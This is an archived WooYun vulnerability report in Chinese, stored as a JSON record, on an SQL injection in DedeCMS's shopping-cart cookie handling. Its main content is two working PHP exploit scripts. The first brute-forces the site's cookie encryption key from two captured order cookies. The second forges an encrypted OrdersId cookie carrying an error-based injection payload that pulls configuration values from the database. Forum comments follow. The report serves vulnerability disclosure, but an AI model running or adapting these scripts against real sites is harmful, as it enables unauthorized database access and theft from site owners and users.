{"id": 14651, "wybug_id": "wooyun-2013-018567", "wybug_title": "dedecms sql injection", "wybug_corp": "dedecms", "wybug_author": "yy520", "wybug_date": "2013-02-10 11:17", "wybug_open_date": "2013-02-10 11:17", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-02-10：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-02-10：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 一枚利用起来略微微复杂的sql injectgpc on happy new year :) 详细说明：  在 include/shopcar.class.php中先看一下这个shopcar类是如何生成cookie的\n239      function saveCookie($key,$value) 240      { 241          if(is_array($value)) 242          { 243              $value = $this->enCrypt($this->enCode($value)); 244          } 245          else 246          { 247              $value = $this->enCrypt($value); 248          } 249          setcookie($key,$value,time()+36000,'/'); 250      }\n简单的说，$key就是cookie的key，value就是value，enCode的作用是将array类型转变为a=yy&b=cc&d=know这样的类型，关键是enCrypt函数\n186      function enCrypt($txt) 187      { 188          srand((double)microtime() * 1000000); 189          $encrypt_key = md5(rand(0, 32000)); 190          $ctr = 0; 191          $tmp = ''; 192          for($i = 0; $i < strlen($txt); $i++) 193          { 194              $ctr = $ctr == strlen($encrypt_key) ? 0 : $ctr; 195              $tmp .= $encrypt_key[$ctr].($txt[$i] ^ $encrypt_key[$ctr++]); 196          } 197          return base64_encode($this->setKey($tmp)); 198      } 213      function setKey($txt) 214      { 215          global $cfg_cookie_encode; 216          $encrypt_key = md5(strtolower($cfg_cookie_encode)); 217          $ctr = 0; 218          $tmp = ''; 219          for($i = 0; $i < strlen($txt); $i++) 220          { 221              $ctr = $ctr == strlen($encrypt_key) ? 0 : $ctr; 222              $tmp .= $txt[$i] ^ $encrypt_key[$ctr++]; 223          } 224          return $tmp; 225      }\nenCrypt的参数$txt 我们是可知的，返回值就是cookie的值，这个我们也是可知的然后到了enCrypt调用 setKey时的参数$tmp，这个参数在某种意义上，我们也是可知的，因为$encrypt_key = md5(rand(0, 32000));只有32000种可能，我们可以推出32000种可能的$tmp，从而推出32000种可能的md5(strtolower($cfg_cookie_encode))，对了，忘记说了，我们的目的是推测出setKey中$encrypt_key的值，然后才能任意构造出购物车的cookie，从推出的32000种md5(strtolower($cfg_cookie_encode))，简单过滤掉非字母数字的key，就只剩下几百个可能的key，然后我们再从新下一次订单，然后再获取几百个可能的key，然后取交集，得到最终key。具体代码如下：\n<?php$cookie1 = \"X2lRPFNlCmlWc1cvAHNXMABjAToHbVcyB3ZXJFIwA20LIAlzU2ULPARyAmQGIVU5VyJbfFVsBiYNN1dsUG0DIl90UTFTLAo3VjBXYgBvVzgAZAEqBz9XagclVzBSbw==\"; // here is the first cookie,change here $cookie2 = \"ADYCb1RiBmUDJghwUyAFYlIxW2BROwhtVCUIe1AyC2UOJVMpADYBNgJ0AmRUcw5iAncAJ1JrCSlQalBrAj8CIwArAmJUKwY7A2UIPVM8BWpSNltwUWkINVR2CG9QbQ==\"; // here is the second cookie ,change here$plantxt = \"id=2&price=0&units=fun&buynum=1&title=naduohua1\"; // here is the text , change herefunction reStrCode($code,$string){    $code = base64_decode($code);    $key = \"\";       for($i=0 ; $i<32 ; $i++)    {        $key .= $string[$i] ^ $code[$i];    }    return $key;}function getKeys($cookie,$plantxt){    $tmp = $cookie;    $results = array();    for($j=0 ; $j < 32000; $j++)    {        $txt = $plantxt;        $ctr = 0;        $tmp = '';        $encrypt_key = md5($j);        for($i =0; $i < strlen($txt); $i ++)        {             $ctr = $ctr == strlen($encrypt_key) ? 0 : $ctr;            $tmp .= $encrypt_key[$ctr].($txt[$i] ^ $encrypt_key[$ctr++]);            }        $string = $tmp;        $code = $cookie;              $result = reStrCode($code,$string);        if(eregi('^[a-z0-9]+$',$result))        {            echo $result.\"\\n\";            $results[] = $result;        }    }    return $results;  }$results1 = getKeys($cookie1,$plantxt);$results2 = getKeys($cookie2,$plantxt);print \"\\n--------------------real key--------------------------\\n\";foreach($results1 as $test1){    foreach($results2 as $test2)    {        if($test1 == $test2)        {            echo $test1.\"\\n\";        }    }}  ?>\ncookie1 和 cookie2 是我下了两次订单后分别生成的cookie，plantxt可以根据页面来自己推算，大概就是这个格式：id=2&price=0&units=fun&buynum=1&title=naduohua1然后推算出md5(strtolower($cfg_cookie_encode))得到这个key之后，我们就可以构造任意购物车的cookie接着看\n20  class MemberShops  21  {  22      var $OrdersId;  23      var $productsId;  24    25      function __construct()  26      {  27          $this->OrdersId = $this->getCookie(\"OrdersId\");  28          if(empty($this->OrdersId))  29          {  30              $this->OrdersId = $this->MakeOrders();  31          }  32      }\n发现OrderId是从cookie里面获取的然后/plus/carbuyaction.php中的\n29      $cart    = new MemberShops();  39      $OrdersId = $cart->OrdersId;        //本次记录的订单号...... 173          $rows = $dsql->GetOne(\"SELECT `oid` FROM #@__shops_orders WHERE oid='$OrdersId' LIMIT 0,1\");\n接着我们就可以注入了通过利用下面代码生成cookie：\n<?php$txt = \"1' or 1=@`\\'` and (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(substring((select value from #@__sysconfig where aid=3),1,62)))a from information_schema.tables group by a)b) or 1=@`\\'` or '1'='1\";$encrypt_key = \"9f09293b7419ed68448fb51d5b174834\";   // here is the key, please change here    function setKey($txt)    {        global $encrypt_key;           $ctr = 0;        $tmp = '';        for($i = 0; $i < strlen($txt); $i++)        {            $ctr = $ctr == strlen($encrypt_key) ? 0 : $ctr;            $tmp .= $txt[$i] ^ $encrypt_key[$ctr++];        }        return $tmp;    }    function enCrypt($txt)    {        srand((double)microtime() * 1000000);        $encrypt_key = md5(rand(0, 32000));        $ctr = 0;        $tmp = '';        for($i = 0; $i < strlen($txt); $i++)        {            $ctr = $ctr == strlen($encrypt_key) ? 0 : $ctr;            $tmp .= $encrypt_key[$ctr].($txt[$i] ^ $encrypt_key[$ctr++]);        }        return base64_encode(setKey($tmp));    }for($dest =0;$dest = enCrypt($txt);){    if(!strpos($dest,'+'))    {        break;    }}echo $dest.\"\\n\";?>\n   漏洞证明：  本地测试成功   修复方案：     版权声明：转载请注明来源 yy520@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2013-02-10 12:29 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  大哥是黑客    \n     2013-02-13 15:45 |    \t\tc4rp3nt3r \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:10        | 人生的意义就在于从一个圈子跳到另一个更大...)\t\t \n  真心赞,这么好玩的漏洞,这么详细的分析.wooyun还不给rank...    \n     2013-02-13 22:31 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  @c4rp3nt3r @yy520 @疯狗 @牛奶坦克 @Ray  if(!strpos($dest,'+'))    {        break;    }  为什么要这个代码 求解。    \n     2013-02-17 10:46 |    \t\t盛大网络(乌云厂商)\t\t \n  牛逼    \n     2013-02-17 11:40 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  哟，有点吊哦    \n     2013-02-17 12:42 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  @xsser  if(!strpos($dest,'+')) { break; } 为什么要这个代码 求解。     \n     2013-02-17 16:37 |    \t\t神刀 \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:3        | www.shellsec.com内射那么牛，虾米没妹子？)\t\t \n  大哥是黑客     \n     2013-02-18 10:18 |    \t\t盛大网络(乌云厂商)\t\t \n  if(!strpos($dest,'+')) { break; }   执行一次循环退出    \n     2013-02-18 17:38 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  @盛大网络 含义真牛逼 谢谢盛大黑阔    \n     2013-02-25 21:01 |    \t\t鬼哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:136 漏洞数:13        | 鬼哥 ！！！！)\t\t \n  cfg_cookie_encode 能知道？？    \n     2013-04-20 13:58 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  碰撞出cfg_cookie_encode的md5 @鬼哥    \n     2013-06-26 11:11 |    \t\treall \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 小菜一个，不会挖0day，所以只有挖1day了，...)\t\t \n  我是来膜拜的。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}